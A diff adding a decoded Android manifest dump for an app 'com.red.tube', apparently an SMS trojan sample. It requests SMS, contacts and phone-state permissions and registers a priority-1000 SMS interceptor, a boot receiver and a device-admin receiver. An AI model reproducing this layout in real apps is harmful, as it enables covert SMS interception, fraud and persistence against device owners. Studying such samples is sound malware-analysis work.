@@ -1,0 +1,77 @@
+manifest
+- package: com.red.tube
+- versionName: 1.0
+- versionCode: 1
+	uses-sdk
+	- minSdkVersion: 7
+	uses-permission
+	- name: android.permission.WRITE_SMS
+	uses-permission
+	- name: android.permission.READ_SMS
+	uses-permission
+	- name: android.permission.SEND_SMS
+	uses-permission
+	- name: android.permission.RECEIVE_SMS
+	uses-permission
+	- name: android.permission.WRITE_EXTERNAL_STORAGE
+	uses-permission
+	- name: android.permission.WAKE_LOCK
+	uses-permission
+	- name: android.permission.READ_PHONE_STATE
+	uses-permission
+	- name: android.permission.READ_EXTERNAL_STORAGE
+	uses-permission
+	- name: android.permission.READ_CONTACTS
+	uses-permission
+	- name: android.permission.RECEIVE_BOOT_COMPLETED
+	uses-permission
+	- name: android.permission.WAKE_LOCK
+	uses-permission
+	- name: com.android.system.permission.C2D_MESSAGE
+	uses-permission
+	- name: com.google.android.c2dm.permission.RECEIVE
+	uses-permission
+	- name: android.permission.BROADCAST_PACKAGE_REMOVED
+	application
+	- icon: 2130837512
+	- name: RedT
+	- label: 2131034112
+	- debuggable: false
+		activity
+		- name: com.red.tube.AnfortActivity
+		- label: 2131034112
+		- screenOrientation: 1
+			intent-filter
+				action
+				- name: android.intent.action.MAIN
+				category
+				- name: android.intent.category.LAUNCHER
+		receiver
+		- name: com.red.tube.SmsHandler
+			intent-filter
+			- priority: 1000
+				action
+				- name: android.provider.Telephony.SMS_RECEIVED
+		service
+		- name: MyService
+		- label: MyService
+			intent-filter
+				action
+				- name: .MyService
+				- value: com.javaorigin.android.sample.service.MY_SERVICE
+		receiver
+		- name: com.red.tube.BootBroadcastReceiver
+			intent-filter
+				action
+				- name: android.intent.action.BOOT_COMPLETED
+		receiver
+		- name: com.red.tube.DeviceAdminReceiver
+		- description: 2131034114
+		- permission: android.permission.BIND_DEVICE_ADMIN
+		- label: 2131034113
+			meta-data
+			- name: android.app.device_admin
+			- resource: 2130968576
+			intent-filter
+				action
+				- name: android.app.action.DEVICE_ADMIN_ENABLED
